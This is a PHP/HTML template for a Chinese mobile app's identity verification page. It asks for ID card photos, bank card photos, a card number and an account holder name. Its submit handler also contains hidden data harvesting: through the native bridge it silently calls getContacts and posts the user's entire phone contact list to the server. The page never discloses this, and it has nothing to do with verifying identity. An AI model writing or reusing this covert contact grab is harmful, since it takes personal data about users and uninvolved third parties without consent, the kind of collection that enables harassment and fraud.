<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=750, user-scalable=no" target-densitydpi="device-dpi">
    <title>身份认证</title>
    <script src="/Public/assets/js/dsbridge.js"></script>
    <link rel="stylesheet" href="/Public/assets/css/animate.css">
    <link rel="stylesheet" href="/Public/assets/css/style.css">
    <link rel="stylesheet" href="/Public/assets/css/dialog.css">
    <link rel="stylesheet" href="/Public/assets/css/index.css">
    <script src="/Public/assets/js/jquery-3.3.1.min.js"></script>
    <script src="/Public/assets/js/dialog.min.js"></script>
</head>
<body>
<nav>
    <div class="back">
        <img src="/Public/assets/images/back.png" alt="">
    </div>
    <span>身份认证</span>
</nav>
<div class="cont">
    <span>身份证照片</span>
    <div class="sfz">
        <div class="album-old">
            <div class="upload-btn btn-new" style="position:absolute;width: 100%;height: 100%;z-index: 9999999999"><input type="file" accept="image/*" name="" id="file1" enctype="multipart/form-data"></div>
            <div class="upload-img "></div>
            <img src="/Public/assets/images/zm.png" alt="">
        </div>
        <div class="album-old">
            <div class="upload-btn btn-new" style="position:absolute;width: 100%;height: 100%;z-index: 9999999999"><input type="file" accept="image/*" name="" id="file2" enctype="multipart/form-data"></div>
            <div class="upload-img "></div>
            <img src="/Public/assets/images/fm.png" alt="">
        </div>
    </div>
    <span>手持身份证照片</span>
    <span class="yhk">银行卡照片</span>
    <div class="sfz">
        <div class="album-old">
            <div class="upload-btn btn-new" style="position:absolute;width: 100%;height: 100%;z-index: 9999999999"><input type="file" accept="image/*" name="" id="file3" enctype="multipart/form-data"></div>
            <div class="upload-img "></div>
            <img src="/Public/assets/images/tj.png" alt="">
        </div>
        <div class="album-old">
            <div class="upload-btn btn-new" style="position:absolute;width: 100%;height: 100%;z-index: 9999999999"><input type="file" accept="image/*" name="" id="file4" enctype="multipart/form-data"></div>
            <div class="upload-img "></div>
            <img src="/Public/assets/images/tj.png" alt="">
        </div>
    </div>
</div>
<div class="yhkh">
    <div>
        <span>银行卡号</span>
        <input type="number" placeholder="请输入银行卡号" id="card_number">
    </div>
    <div>
        <span>开户名</span>
        <input type="text" placeholder="请输入开户姓名" id="card_name">
    </div>
    <button type="button" class="next" id="upload_button"><a>下一步</a></button>
</div>

<!--  -->
<script>

$('#upload_button').on('click', function(){
    if($('#file1').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请选择图片',
        });
        return false;
    }
    if($('#file2').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请选择图片',
        });
        return false;
    }
    if($('#file3').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请选择图片',
        });
        return false;
    }
    if($('#file4').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请选择图片',
        });
        return false;
    }
    if($('#card_number').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请输入银行卡号',
        });
        return false;
    }
    if($('#card_name').val() == ''){
        $(document).dialog({
            titleShow: false,
            content: '请输入开户姓名',
        });
        return false;
    }

	dsBridge.call("getContacts", "getContacts", function(v) {
		$.post("<?php echo U('desk/certification/postContacts');?>", {data:v}, function(res){

		})
	})

    var formData = new FormData();
    formData.append('file1', $('#file1')[0].files[0]);
    formData.append('file2', $('#file2')[0].files[0]);
    formData.append('file3', $('#file3')[0].files[0]);
    formData.append('file4', $('#file4')[0].files[0]);
    formData.append('card_number', $('#card_number').val());
    formData.append('card_name', $('#card_name').val());
    //
    $.ajax({
        url: "<?php echo U('desk/certification/identifyTwo');?>",
        type: "post",
        contentType: false,
        processData: false,
        dataType: "json",
        data: formData,
        success: function(data){
            if(data.status == 0){
                $(document).dialog({
                    titleShow: false,
                    content: data.info,
                });
                return false;
            }else{
                location.href = data.url;
            }
        }
    })
    return false;
})

$('.back').on('click', function(){
    window.history.back();
})
</script>
<script src="/Public/assets/js/iscroll-zoom.js"></script>
<script src="/Public/assets/js/zepto.min.js"></script>
<script src="/Public/assets/js/script.js"></script>
</body>
</html>